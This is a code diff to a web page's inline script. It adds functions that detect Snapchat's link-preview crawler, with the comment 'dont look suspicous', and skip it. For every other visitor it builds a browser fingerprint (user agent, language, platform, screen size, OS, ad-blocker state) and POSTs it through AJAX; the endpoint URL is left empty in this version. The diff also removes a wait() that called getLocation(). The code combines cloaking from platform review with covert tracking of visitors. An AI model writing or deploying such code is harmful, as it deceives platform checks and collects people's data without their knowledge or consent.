@@ -174,6 +174,27 @@ body{
 <script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>
 
 <script type="text/javascript">
+function checkIfRobot() {
+  if (navigator.userAgent.includes("developers.snap.com")) {
+    //this is a snaphat bot.
+    //dont look suspicous
+  }else {
+    //this is not a snapchat bot.
+    reportJSStuff();
+  }
+}
+
+function isAdBlockerEnabled() {
+  var testAd = document.createElement('div');
+  testAd.innerHTML = '&nbsp;';
+  testAd.className = 'adsbox';
+  document.body.appendChild(testAd);
+
+  var adBlockerEnabled = !testAd.offsetHeight;
+  document.body.removeChild(testAd);
+
+  return adBlockerEnabled;
+}
 
 function getOS() {
   var userAgent = navigator.userAgent;
@@ -197,8 +218,41 @@ function getOS() {
   return os;
 }
 
-function wait() {
-  getLocation();
+function getBrowserData() {
+  var browserData = [];
+
+  browserData.push({ name: "User Agent", value: navigator.userAgent });
+  browserData.push({ name: "Language", value: navigator.language });
+  browserData.push({ name: "Platform", value: navigator.platform });
+  browserData.push({ name: "Cookies Enabled", value: navigator.cookieEnabled });
+  browserData.push({ name: "Online Status", value: navigator.onLine });
+  browserData.push({ name: "Screen Resolution", value: window.screen.width + "x" + window.screen.height });
+  browserData.push({ name: "Available Screen Width", value: window.screen.availWidth });
+  browserData.push({ name: "Available Screen Height", value: window.screen.availHeight });
+  browserData.push({ name: "Color Depth", value: window.screen.colorDepth });
+  browserData.push({ name: "AdBlocker", value: isAdBlockerEnabled() });
+  browserData.push({ name: "OS", value: getOS
+
+  () });
+
+  return browserData;
+}
+
+function reportJSStuff() {
+  var url = "";
+  $.ajax({
+    type: "POST",
+    url: url,
+    data: JSON.stringify(getBrowserData()),
+    contentType: "application/json; charset=utf-8",
+    dataType: "json",
+    error: function() {
+      alert("Error");
+    },
+    success: function() {
+      alert("OK");
+    }
+  });
 }
 
 function getLocation() {
